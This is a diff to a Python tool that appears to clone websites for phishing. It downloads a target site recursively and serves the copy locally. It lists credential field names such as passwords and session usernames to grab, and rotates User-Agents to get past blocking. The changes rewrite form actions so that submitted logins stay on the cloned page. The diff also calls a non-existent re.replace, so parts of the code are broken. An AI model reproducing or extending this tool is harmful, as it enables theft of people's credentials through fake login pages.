@@ -21,12 +21,12 @@ users = []
 
 # keep increasing if something dont grab :)
 
-references = "username","user","user_login","email","number","user_password","user_pass","pass","passwd","password","pwd","session[password]","session[username_or_email]"
+references = "username","user","user_login","email","pass","number","user_password","user_pass","passwd","password","pwd","session[password]","session[username_or_email]"
 
 # User-Agents
 a_user_agents = {
     0:"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-    1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64)" # add more*
 }
 
 def recursive_downloader(target_url):
@@ -305,9 +305,10 @@ def recursive_downloader(target_url):
     
     # modify the webpage t correctly find the location of all files
     
-    a = open("./index.html","w")
+    #a = open("./index.html","w")
     
     with open('./index.html','wb') as a:
+        new_f = re.sub(r'action="[\'"]?([^\'">]+)"',"action='#'",new_f)
         a.write(new_f.encode())
         
     print("[+] Finished recursive download, starting server")
@@ -316,6 +317,7 @@ def download_url(url):
     global page
     default_agent = a_user_agents[0]
     html = ""
+    #myre_js = re.findall(r'script src="[\'"]?([^\'">]+).js"',f)
 
     print("[!] Downloading...")
     
@@ -327,6 +329,8 @@ def download_url(url):
     try:
         target = urllib.request.urlopen(request,timeout=60)
         html = target.read()
+        html = re.replace(r'action="[\'"]?([^\'">]+)"',"action='#'",html)
+        
     except ConnectionResetError:
         print("[!] Remote host blocked our connection")
         print("[+] Trying to bypass with User-Agent rotation...")
@@ -339,6 +343,8 @@ def download_url(url):
             try:
                 target = urllib.request.urlopen(request,timeout=60)
                 html = target.read()
+                html = re.replace(r'action="[\'"]?([^\'">]+)"',"action='#'",html)
+                
                 print("[+] Sucefully bypassed")
                 break
             except ConnectionResetError:
